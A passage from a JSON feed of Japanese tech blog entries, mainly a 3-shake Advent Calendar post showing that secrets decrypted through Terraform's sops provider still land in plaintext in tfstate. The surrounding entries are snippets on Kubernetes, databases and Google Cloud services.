9日目のエントリ記事です。技術的な話ではありませんはじめに国語がとても苦手だった私は、社会人になったときに日本語力の無さにかなり苦労しました。そんな中、「日本語の作文技術」という本を読み、わかりや...","isoDate":"2023-12-08T22:01:43.000Z","dateMiliSeconds":1702072903000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか","link":"https://blog.masasuzu.net/entry/2023/12/09/014230","contentSnippet":"qiita.comこの記事は、3-shake Advent Calendar 2023の9日目の記事となります。sops プロバイダーとは本当に安心?ドキュメントを調べる挙動を実験する結論ワークアラウンドsops プロバイダーとはcarlpett/terraform-provider-sops: A Terraform provider for reading Mozilla sops filesDocs overview | carlpett/sops | Terraform | Terraform RegistrysopsプロバイダーはMozilla sopsを使用して暗号化されたファイルから機密情報を取り出して、terraform上で使用できるようにしたものです。暗号化の鍵をAWS KMS等を使うことにより、KMSキーを使う権限を持つ人だけ機密情報にアクセスできるようにするものです。sopsで機密情報を暗号化することにより、平文で機密情報をgitレポジトリに保存することがなくなり安全ということになります。機密情報を管理したい。でも平文では保存したくない。そういう用途にこちらは使用されます。本当に安心?SOPSを使って機密情報を暗号化することによりgitレポジトリには機密情報が平文で残らない。これで安心と言われていますが、よく考えると機密情報をterraform実行時にはリソースに対して平文で与えているはずです。つまり、tfstate上は機密情報が平文で保存されています。例えば、tfstateがS3に保存されているとして、KMSキーへの権限がない人でもS3バケットにアクセスする権限があれば、平文の機密情報が見れてしまいます。あまりないと思いますが、tfstateをlocalに保存するようにしていてそれをgit管理していてらなんのために暗号化しているのか。。。。ということになります。こう考えると組織のポリシーによるが、sopsプロバイダーによる暗号化では不十分ではないかという疑問が生まれます。ドキュメントを調べるまずプロバイダードキュメントを当たってみます。Docs overview | carlpett/sops | Terraform | Terraform RegistryTo prevent plaintext secrets from being written to disk, you\xa0must\xa0use a secure remote state backend. See the\xa0official docs\xa0on\xa0Sensitive Data in State\xa0for more information.これが意味してるのはバックエンドをlocalにした場合平文で機密情報が書かれるので、安全なリモートバックエンドを利用すべきということだと思います。State: Sensitive Data | Terraform | HashiCorp Developer参照しろと言われたドキュメントの該当部分を読んでみましょう。ローカルディスクにtfstateを保存した場合は、機密情報が平文で保存されます。リモートにtfstateを保存する場合、保存時に暗号化されるかはバックエンドに依存します。基本的にリモートステートを使うことを推奨しています。例えば、Terraform Cloudを使う場合、tfstateは暗号化され、転送時もTLSで暗号化されます。S3を使う場合もSSE-S3やSSE-KMS等でサーバサイド暗号化を有効にしておくことで、保管時の暗号化がされます。バケットポリシーでHTTPSを強制することで通信時の暗号化も保証することができます。参考: 暗号化によるデータの保護 - Amazon Simple Storage Service参考: Amazon S3 のセキュリティのベストプラクティス - Amazon Simple Storage Serviceところがですね。保存時、通信時の暗号化をしても、terraform state pullすると平文でtfstateが手に入ってしまうんですよ。。。後述します。挙動を実験する以下のような設定ファイルを作ります。sopsで暗号化したdb_userとdb_passwordをパラメータストアに設定するものになります。tools-versionsterraform 1.5.5sops 3.7.3main.tfterraform {  required_version = \\"~> 1.5.5\\"  required_providers {    aws = {      source  = \\"hashicorp/aws\\"      version = \\"~> 5.15\\"    }    sops = {      source  = \\"carlpett/sops\\"      version = \\"~> 0.7.2\\"    }  }  backend \\"s3\\" {    region  = \\"ap-northeast-1\\"    bucket  = \\"xxxxxxxxxx\\"    key     = \\"test.tfstate\\"  }}provider \\"sops\\" {}provider \\"aws\\" {  region = \\"ap-northeast-1\\"}data \\"sops_file\\" \\"secrets\\" {  source_file = \\"secrets.yaml\\"}resource \\"aws_ssm_parameter\\" \\"db_user\\" {  type     = \\"String\\"  name     = \\"/test/db_user\\"  value    = data.sops_file.secrets.data.db_user}resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    = data.sops_file.secrets.data.db_password}暗号化前の secrets.yamldb_user: userdb_password: passwordapply結果がこちらとなります。terraform apply% export SOPS_KMS_ARN=arn:aws:kms:ap-northeast-1:xxxxxxxxx:key/yyyyyyyyyyyyyyyyyy% terraform applydata.sops_file.secrets: Reading...data.sops_file.secrets: Read complete after 1s [id=-]Terraform used the selected providers to generate the following execution plan. Resource actions areindicated with the following symbols:  + createTerraform will perform the following actions:  # aws_ssm_parameter.db_password will be created  + resource \\"aws_ssm_parameter\\" \\"db_password\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_password\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"SecureString\\"      + value          = (sensitive value)      + version        = (known after apply)    }  # aws_ssm_parameter.db_user will be created  + resource \\"aws_ssm_parameter\\" \\"db_user\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_user\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"String\\"      + value          = (sensitive value)      + version        = (known after apply)    }Plan: 2 to add, 0 to change, 0 to destroy.Do you want to perform these actions?  Terraform will perform the actions described above.  Only \'yes\' will be accepted to approve.  Enter a value: yesaws_ssm_parameter.db_password: Creating...aws_ssm_parameter.db_user: Creating...aws_ssm_parameter.db_user: Creation complete after 0s [id=/test/db_user]aws_ssm_parameter.db_password: Creation complete after 0s [id=/test/db_password]Apply complete! Resources: 2 added, 0 changed, 0 destroyed.terraform apply  8.91s user 0.78s system 124% cpu 7.811 totalstate showするとパラメータストアなのでsensitive扱いになっていて、見れません。これはいけるか?terraform state show% terraform state show aws_ssm_parameter.db_password# aws_ssm_parameter.db_password:resource \\"aws_ssm_parameter\\" \\"db_password\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\"    data_type = \\"text\\"    id        = \\"/test/db_password\\"    key_id    = \\"alias/aws/ssm\\"    name      = \\"/test/db_password\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"SecureString\\"    value     = (sensitive value)    version   = 1}% terraform state show aws_ssm_parameter.db_user    # aws_ssm_parameter.db_user:resource \\"aws_ssm_parameter\\" \\"db_user\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_user\\"    data_type = \\"text\\"    id        = \\"/test/db_user\\"    name      = \\"/test/db_user\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"String\\"    value     = (sensitive value)    version   = 1}ここで、terraform state pullをしてみて、tfstateファイルをローカルにダウンロードします。そのtfstateファイルの中の該当部分はこちらとなります。    {      \\"mode\\": \\"managed\\",      \\"type\\": \\"aws_ssm_parameter\\",      \\"name\\": \\"db_password\\",      \\"provider\\": \\"provider[\\\\\\"registry.terraform.io/hashicorp/aws\\\\\\"]\\",      \\"instances\\": [        {          \\"schema_version\\": 0,          \\"attributes\\": {            \\"allowed_pattern\\": \\"\\",            \\"arn\\": \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\",            \\"data_type\\": \\"text\\",            \\"description\\": \\"\\",            \\"id\\": \\"/test/db_password\\",            \\"insecure_value\\": null,            \\"key_id\\": \\"alias/aws/ssm\\",            \\"name\\": \\"/test/db_password\\",            \\"overwrite\\": null,            \\"tags\\": null,            \\"tags_all\\": {},            \\"tier\\": \\"Standard\\",            \\"type\\": \\"SecureString\\",            \\"value\\": \\"password\\",            \\"version\\": 1          },          \\"sensitive_attributes\\": [            [              {                \\"type\\": \\"get_attr\\",                \\"value\\": \\"value\\"              }            ]          ],          \\"private\\": \\"bnVsbA==\\",          \\"dependencies\\": [            \\"data.sops_file.secrets\\"          ]        }      ]    },tfstateファイルの中身をよく確認するとしっかり平文で見えています。残念。\\"value\\": \\"password\\",結論sopsプロバイダーを使用することによりgitレポジトリ上に機密情報を平文で保存することはなくなります。しかしながら、tfstateのデータ上では設定値が平文で保存されることを防ぐことはできません。terraform state pullする権限があれば、機密情報が見れてしまいます。運用組織のポリシーで、tfstateへのアクセス権限を適切に権限管理することができるのであれば、選択肢としては取りうります。暗号化のためのKMSキー、tfstateを保存するS3バケットを機密情報をアクセス可能な人のみ権限を与えることが徹底できればよいです。しかしながら、機密情報をいかなる場合でもローカルに平文で保存することが許容されない組織であれば、機密情報は手動で設定することを選択したほうが望ましいと思います。どうしても機密情報をterraformで管理したのであれば、クライアントサイドで暗号化した機密情報をterraformで管理し、アプリ等で使用時にクライアントサイドで復号を行う形も考えられます。安全かどうかは、tfstateの保存場所、tfstateへのアクセス権限、暗号化鍵のアクセス権限それぞれが適切に設定されているかどうかが鍵となります。他に何かうまい方法で機密情報を管理しているという方がいらっしゃれば、ご意見ください。ワークアラウンドこれは自分がよく使う手段となります。リソースの箱だけ作って、作成時にダミーの値を入れておき、実際の値は手動で設定するという手法です。ignore_changesを入れておくことで、手動で値を変更しても、terraform的には差分ができないようにしています。これにより、機密情報をterraformの外に追い出しつつも、機密情報を入れるリソース自体は監理するということが実現できます。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}","isoDate":"2023-12-08T16:42:30.000Z","dateMiliSeconds":1702053750000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AlloyDB omni on Kubernetesを眺める","link":"https://zenn.dev/nnaka2992/articles/viewing_alloydb_omni_operator","contentSnippet":"このエントリーは以下のアドベントカレンダーの6日目の記事です。3-shake Advent Calendar 2023 シリーズ1昨日は@bells17さんによるChainguard imagesについて調べてみたでした。PostgreSQL Advent Calendar 2023 シリーズ2Kubernetes Advent Calendar 2023昨日は@yassan168さんによるRKE2ノードのCiliumを使ったeBPFな帯域制限をする話でした。 背景を眺める2023年10月12日にAlloyDB OmniのGAに併せてAlloyDB Omni o...","isoDate":"2023-12-05T23:30:00.000Z","dateMiliSeconds":1701819000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Chainguard imagesについて調べてみた","link":"https://zenn.dev/bells17/articles/chainguard-images","contentSnippet":"※この記事は3-shake Advent Calendar 2023 シリーズ1の12月5日の記事です最近Chainguard imagesというdistrolessコンテナイメージについて知ったので、簡単に調べてみました。 Chainguard imagesとは？Chainguard imagesはChainguard社によって提供されているdistrolessを中心としたセキュアなコンテナイメージ群だ、という理解です。Wolfiという(おそらくこれもChainguard社が開発している)コンテナ・クラウドネイティブ用途向けのLinux undistroなOSを利用して各C...","isoDate":"2023-12-05T03:58:09.000Z","dateMiliSeconds":1701748689000,"authorName":"bells17","authorId":"bells17"},{"title":"Cloud Loggingについて","link":"https://zenn.dev/nedoko_dok0dko/articles/ef07acbb983d01","contentSnippet":"whatGoogle CloudのCloud Loggingについて基本概要など調べたことをまとめる適宜追記予定 Cloud Loggingとはhttps://cloud.google.com/logging/docs/overview?hl=jaGoogleCloud上のシステム等が生成したログを収集・保管・管理するための仕組み。基本的にGoogleCloud上のサービスが出力するログはCloud Loggingへと集められる。収集されたログはログバケットと呼ばれるストレージで保管され、期間が過ぎたら破棄するといった設定を行うことが可能。ログはコンソールのログ...","isoDate":"2023-12-04T11:05:41.000Z","dateMiliSeconds":1701687941000,"authorName":"seno","authorId":"seno"},{"title":"吉祥寺.pm35 でLTしてきました。 #kichijojipm","link":"https://blog.masasuzu.net/entry/2023/12/03/161754","contentSnippet":"吉祥寺.pm こと 句会吉祥寺.pm35 に参加して、LTしてきました。kichijojipm.connpass.com資料はこちら。言いたいこととしてはベストプラクティスなんてないよ。一般的によりよいプラクティスやパターンはあるけど、どんなときには適用できる銀の弾丸的なものはないから、自身の組織とサービスに合わせてくみ上げていきましょうということ。正解はひとつ!じゃない!!その上で、ざっくりとどんな選択肢と選択するための観点を述べていきました。まだ全然ブラッシュアップできるのでどこかでまとめてブログに書きたいところです。ちなみに最後に出てくる あなたらしく○○ は同僚のスライドのパロディです。毎回時間オーバーするのでトークで申し込んだ方が良いのでは?というツッコミはごもっともです。懇親会でもTerraformのお悩みとか短いですが話せて楽しかったです。また参加したいですね。","isoDate":"2023-12-03T07:17:54.000Z","dateMiliSeconds":1701587874000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Auroraアップグレード時のBlue/Green Deploymentsの利用","link":"https://zenn.dev/hakushou41/articles/70b83066cd1741","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 4日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめにAmazon Aurora2系について、標準サポート終了日(2024/10/31)まで1年を切りました。依然として、Aurora2系を利用しているシステムは多いのではないでしょうか。アプリケーションのテストや検証を考えると早めに動いていかなければならない時期となりました。本記事では、アップグレード方式・方針の一つとして、AWSからも推奨されているRDS Blue/Green Deplo...","isoDate":"2023-12-03T07:12:32.000Z","dateMiliSeconds":1701587552000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"Playwright Test generatorを利用したE2Eテスト ことはじめ","link":"https://zenn.dev/hakushou41/articles/65bc815b14354f","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 3日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに現在、私はマイクロサービスを運用するSREを支援する人として活動しています。運用チームやSREが主導となって実施するメンテナンスやアップデート作業などでは、アップデート後の動作確認として、ブラウザを介したWebアプリケーションの簡易目視確認をします。これらの確認項目は、手順書へ項目を記載し、必要に応じてエビデンスをスクリーンショットで取得する必要があります。確認作業を網羅的にしようとす...","isoDate":"2023-12-02T15:00:00.000Z","dateMiliSeconds":1701529200000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"2023-12-01 吉祥寺.pm ベストプラクティスと組織とIaC","link":"https://speakerdeck.com/masasuzu/2022-12-01-ji-xiang-si-dot-pm","contentSnippet":"ベストプラクティスなんてものはない","isoDate":"2023-12-01T05:00:00.000Z","dateMiliSeconds":1701406800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"データベースエンジニアのためのDB on Kubernetes入門ガイド","link":"https://zenn.dev/nnaka2992/articles/db_on_k8s_guide_for_db_engineers","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 1日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに1959年にW. C. McGeeがデータベースという概念を提唱してから約65年、様々なアーキテクチャのデータベースが提案され様々なプラットフォームで利用されてきました。古くはメインフレームを中心に動作していたデータベースは、マイコンブームとともにそのアーキテクチャを変えながらにオープン系システムへと主戦場を移して行きました。オープン系が主流になってからもその進化は止まることなく、ベア...","isoDate":"2023-11-30T23:30:01.000Z","dateMiliSeconds":1701387001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KEP-4188: New kubelet gRPC API with endpoint returning local pods info","link":"https://zenn.dev/toversus/articles/791c7916e21059","contentSnippet":"!KEP 持ち寄り会 #1 の登壇資料です。2023/11/27 時点の KEP-4188 の内容です。Kubernetes 1.29 時点で機能として入っていないので注意して下さい。また、後半の文章は考察を含んでおり、正確な情報でない可能性があります。 概要KEP-4188 は、Kubelet に Pod Conditions を公開する gRPC API を追加する KEP です。Pod Conditions は Status フィールドに含まれています。❯ kubectl get pods -n kube-system coredns-5d78c9869d-8gglh ...","isoDate":"2023-11-27T08:23:13.000Z","dateMiliSeconds":1701073393000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"KEP-3063: Dynamic resource allocation","link":"https://speakerdeck.com/bells17/kep-3063-dynamic-resource-allocation","contentSnippet":"KEP持ち寄り会で発表した資料です。\\rKubernetesのKEP \\"Dynamic resource allocation\\" に関する情報をまとめた内容になります。\\r\\rイベントURL: https://kep.connpass.com/event/299651/\\r参考資料:\\r\\rhttps://zenn.dev/toversus/articles/fe2aa06f133b49 \\rhttps://kubernetes.io/blog/2022/12/15/dynamic-resource-allocation/ \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes-sigs/dra-example-driver/blob/main/demo/demo-apps.png \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/components.png \\rhttps://github.com/cncf-tags/container-device-interface \\rhttps://github.com/containerd/containerd/blob/v1.7.9/pkg/cri/server/container_create_linux.go#L417-L419 \\rhttps://github.com/cncf-tags/container-device-interface/blob/main/pkg/cdi/container-edits.go#L70-L148 \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes/kubernetes/pull/111023 \\rhttps://github.com/orgs/kubernetes/projects/95/views/1 \\rhttps://github.com/kubernetes/dynamic-resource-allocation \\rhttps://www.cncf.io/projects/akri/ \\rhttps://github.com/kubernetes-sigs/dra-example-driver \\rhttps://github.com/NVIDIA/k8s-dra-driver \\rhttps://github.com/intel/intel-resource-drivers-for-kubernetes \\rhttps://github.com/intel/intel-device-plugins-for-kubernetes \\rhttps://docs.google.com/document/d/1BNWqgx_SmZDi-va_V31v3DnuVwYnF2EmN7D-O_fB6Oo/edit#heading=h.bxuci8gx6hna \\rhttps://drive.google.com/file/d/1iLg2FEAEilb1dcI27TnB19VYtbcvgKhS/view\\rhttps://developer.nvidia.com/blog/nvidia-gpu-operator-simplifying-gpu-management-in-kubernetes/ \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/overview.html \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/cdi.html \\rhttps://intel.github.io/intel-device-plugins-for-kubernetes/README.html \\rhttps://github.com/NVIDIA/k8s-device-plugin\\rhttps://blogs.nvidia.com/blog/multi-instance-gpus/ \\rhttps://developer.nvidia.com/blog/nvidia-ampere-architecture-in-depth/ \\rhttps://groups.google.com/a/kubernetes.io/g/dev/c/BDtCFfXQbw0?pli=1\\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689 \\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689","isoDate":"2023-11-27T05:00:00.000Z","dateMiliSeconds":1701061200000,"authorName":"bells17","authorId":"bells17"},{"title":"BigQueryの メタデータってどこから見れるの？","link":"https://zenn.dev/nedoko_dok0dko/articles/f6ccafeceac4a3","contentSnippet":"whatBigQueryのメタデータの取得先について簡単にまとめたもの BigQueryのメタデータ、調べることが出来るの?A. 出来るということで、メタデータの主な取得先について記載していく テーブル情報やレコード数BigQueryにはINFORMATION_SCHEMAという、メタデータなどを保持しているビューが存在している。これらを利用してメタデータを取得することが出来る。ただし、テーブルの更新日やテーブルのデータ量については記録されていない。https://cloud.google.com/bigquery/docs/information-sche...","isoDate":"2023-11-21T10:26:24.000Z","dateMiliSeconds":1700562384000,"authorName":"seno","authorId":"seno"},{"title":"ツールごとのOPA/Regoの書き方","link":"https://zenn.dev/tayusa/articles/63f286f4733a87","contentSnippet":"RegoとはKubernetesやTerraformの静的解析で既存のルールでは足りないときや自分でカスタマイズしたいときにRegoというポリシー言語でコードを書くhttps://www.openpolicyagent.org/docs/latest/policy-language/ Regoを利用できるツールの例conftesthttps://www.conftest.dev/自分で全部書くtrivyhttps://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/cust...","isoDate":"2023-11-16T03:05:53.000Z","dateMiliSeconds":1700103953000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"MinIO Client で Amazon S3 や Cloudflare R2 を利用する","link":"https://blog.1q77.com/2023/11/minio-client/","contentSnippet":"Cloudflare R2 は egress の費用がかからないということで手元のファイルのバックアップに使ってみようかなと思ったときにクライアントとして何を使おうかな aws cli 使うほどじゃないしなということで MinIO Client (mc) を使ってみたメモ。","isoDate":"2023-11-12T11:13:31.000Z","dateMiliSeconds":1699787611000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy入門","link":"https://speakerdeck.com/bells17/kube-proxyru-men","contentSnippet":"Kubernetes Novice Tokyo #28 の登壇資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/293157/\\r配信URL: https://www.youtube.com/watch?v=LSW51Cm0Wc0\\r\\rコードリーディングメモ:\\rhttps://zenn.dev/bells17/scraps/5e41da598a8266\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.2 \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://qiita.com/Tocyuki/items/6d90a1ec4dd8e991a1ce \\rhttps://oxynotes.com/?p=6361#5 \\rhttps://atmarkit.itmedia.co.jp/ait/articles/1002/09/news119.html \\rhttps://hana-shin.hatenablog.com/entry/2022/06/21/215757 \\rhttps://qiita.com/syui/items/27020b970775a0c508ba \\rhttps://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://github.com/torvalds/linux/blob/master/Documentation/networking/nf_conntrack-sysctl.rst \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html \\rhttps://man.archlinux.org/man/conntrack.8.en \\rhttps://nomeu.net/8380/ \\rhttps://knowledge.sakura.ad.jp/4048/ \\rhttps://docs.openshift.com/container-platform/4.10/rest_api/network_apis/service-v1.html \\rhttps://stackoverflow.com/questions/75835169/kubernetes-loadbalancer-how-does-healthchecknodeport-work \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/#preserving-the-client-source-ip \\rhttps://kubernetes.io/docs/concepts/services-networking/service-traffic-policy/ \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/ \\rhttps://hyoublog.com/2020/05/20/kubernetes-externalip-service/ \\rhttps://qiita.com/dingtianhongjie/items/8f3c320c4eb5cf25d9de \\rhttps://milestone-of-se.nesuke.com/nw-basic/as-nw-engineer/loopback-address-interface/ \\rhttps://kubernetes.io/docs/reference/networking/virtual-ips/ \\rhttps://kubernetes.io/docs/concepts/services-networking/service/ \\rhttps://kubernetes.io/ja/docs/concepts/services-networking/connect-applications-service/ \\rhttps://knowledge.sakura.ad.jp/22636/ \\rhttps://netfilter.org/index.html \\rhttps://madomadox.hatenablog.com/entry/2021/01/03/190730 \\rhttps://qiita.com/bashaway/items/e405d59d92670fbc5341 \\rhttps://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://eng-entrance.com/linux-firewall \\r\\r\\r画像引用元:\\rhttps://github.com/kubernetes/community/tree/master/icons \\rhttps://github.com/kubernetes/kubernetes/tree/master/logo \\rhttps://github.com/cncf/artwork/tree/master/projects/kubernetes \\rhttps://github.com/kubernetes/kubeadm/tree/main/logos","isoDate":"2023-11-09T05:00:00.000Z","dateMiliSeconds":1699506000000,"authorName":"bells17","authorId":"bells17"},{"title":"Amazon ECSイベントをCloudWatch Logsへ収集する","link":"https://zenn.dev/yuu0w0yuu/articles/df3a9fdef609e2","contentSnippet":"この記事は、3-shake Advent Calendar 2023 1日目のエントリ記事です。 きっかけECSは、Container Insightsを有効化することでクラスタやサービスといった各レイヤのパフォーマンスメトリクスをCloudWatchに収集できる。一方で、以下のようなケースにおいて一定の仮説を導くためには、このメトリクスだけではやや不足感があるため、発生したイベントやその結果を別の方式で監視したくなった。メトリクスがスパイクしたタイミングで何が起きていたか？デプロイを実行したが結果はどうだったか？デプロイが失敗したが原因は何か？などなど・・調べてみ...","isoDate":"2023-11-02T08:33:22.000Z","dateMiliSeconds":1698914002000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】\\"Findy Terraform 活用大全 - IaCの今\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/10/25/550144","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Terraformのtfstateの分割パターンtfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法みんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『 tfstate の分割パターンとディレクトリ構成への適用』ていうテーマで、 Findy Terraform 活用大全 - IaCの今 に登壇したぞ！https://findy.connpass.com/event/298972/『Terraform活用大全 - IaCの今。』の登壇資料です!!tfstateを分割してみんなで最高になろう✌\uD83C\uDFFB#Terraform_findyhttps://t.co/NteGvKdMEE— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) October 25, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-10-25T03:00:00.000Z","dateMiliSeconds":1698202800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83E\uDDD1‍\uD83D\uDE80 tfstate の分割パターンとディレクトリ構成への適用","link":"https://speakerdeck.com/hiroki_hasegawa/tfstate-nofen-ge-hatantoteirekutorigou-cheng-henoshi-yong","contentSnippet":"『Terraform活用大全 - IaCの今』の登壇資料です\\r\\r\\r・Terraformのtfstateの分割パターン\\r・tfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法\\r\\rを紹介しました\\r\\rスライドでは少ししか分割パターンを紹介できませんでしたので、ぜひ元記事 (tfstateファイルの分割パターンとディレクトリ構成への適用) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1717030862452384047","isoDate":"2023-10-24T04:00:00.000Z","dateMiliSeconds":1698120000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day9","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/9_core_functions_high_availability","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Read I/O pathを読みました。今回はArchitecture > Core functions > High Availabilityを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。High availabilityYugabyteDBは一貫性と分断耐性を兼ね備えたデータベースであると同時にリーダーの障害時に新しいリーダーとしてフェイルオーバー出来るアクティブレプリカを持つことで高可用性(HA)を達成している。もしノードに障害が発生した場合、そのノード上で動作するYB-TServerとYB-Masterの停止を引き起こす。YB-TServer failureYB-TServerはYSQLレイヤとアクティブなIOを提供するピアーリーダータブレットを含むタブレットをホストする。YSQレイヤとタブレットピアーフォロワーとタブレットピアーリーダーで発生した障害はそれぞれ特別な方法であつかわれる。YQL failureアプリケーションの視点からみればYQLはステートレスである。そのためクライアントが発行したリクエストは単純に他ノードのYQLにリクエストが送信される。スマートクライアントを利用している場合、スマートクライアントは理想的なYB-TServerの場所をタブレットが所有するキーから検索し、リクエストを直接そのノードに転送する。Tablet peer follower failureタブレットピアーフォロワーはクリティカルパスではない。この障害はユーザーリクエストへの可用性に影響しない。Tablet peer leader failureタブレットピアーリーダーの障害は数秒以内にRaftレベルのリーダー選出を自動的にトリガーし、他のYB-TServerに配置されているタブレットピアーが新しいリーダーとして選出される。タブレットピアリーダーに障害が発生した場合、可用性が損なわている時間は約3秒(ハードビートの感覚がデフォルトの500msの場合)である。YB-Master failureYB-Masterは通常のIOオペレーションではクリティカルパスでは無いため、ユニバースを動作させるのに影響は無い。しかしYB-Masterは異るノードで動作するピアーのRaftグループの一部であるため。このピアーのうちの一つがアクティブなマスターで残りがアクティブスタンバイである。YB-Masterのリーダーであるアクティブマスターに障害が発生した場合、ピアーはリーダーの障害を検知し、新なアクティブマスターであるYB-Masterのリーダーを障害時に数秒以内で再選出する。","isoDate":"2023-10-21T15:12:37.000Z","dateMiliSeconds":1697901157000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google Application Integrationについて","link":"https://zenn.dev/nedoko_dok0dko/articles/365af68bb280e7","contentSnippet":"whatGoogle Cloudの「Application Integration」というサービスについて軽く調べたことをまとめたログ関連してiPaasについても調べたことを記載する Application Integrationとはhttps://cloud.google.com/application-integration?hl=jaGoogle Cloudが提供するIntegration Platform as a Service（iPaaS）ソリューションビジュアルエディタを利用することによって、以下がノーコードで行えるイベントによるトリガーの...","isoDate":"2023-10-18T09:20:05.000Z","dateMiliSeconds":1697620805000,"authorName":"seno","authorId":"seno"},{"title":"コンテナ \xd7 セキュリティ \xd7 AWS","link":"https://speakerdeck.com/kyohmizu/kontena-x-sekiyuritei-x-aws","contentSnippet":"「JAWS-UG コンテナ支部 \xd7 JAWS-UG 千葉支部 #1 今知りたいコンテナセキュリティ」の資料です。\\rhttps://jawsug-container.connpass.com/event/295110/","isoDate":"2023-10-16T04:00:00.000Z","dateMiliSeconds":1697428800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Cloud Asset Inventoryとは","link":"https://zenn.dev/nedoko_dok0dko/articles/e80d73d4f28a79","contentSnippet":"whatGoogle Cloud のCloud Asset Inventoryについて調べてわかったことの個人まとめ Cloud Asset Inventoryとはhttps://cloud.google.com/asset-inventory/docs/overview?hl=jaCloud Asset Inventory は、時系列データベースに基づいてインベントリ サービスを提供します。このデータベースは、Google Cloud のアセット メタデータの 35 日間分の履歴を保持します。過去 35 日間変更がない既存のアセットの場合、Cloud Asset ...","isoDate":"2023-10-13T10:27:12.000Z","dateMiliSeconds":1697192832000,"authorName":"seno","authorId":"seno"},{"title":"kube-controller-manager入門","link":"https://speakerdeck.com/bells17/kube-controller-managerru-men","contentSnippet":"SRETT #7 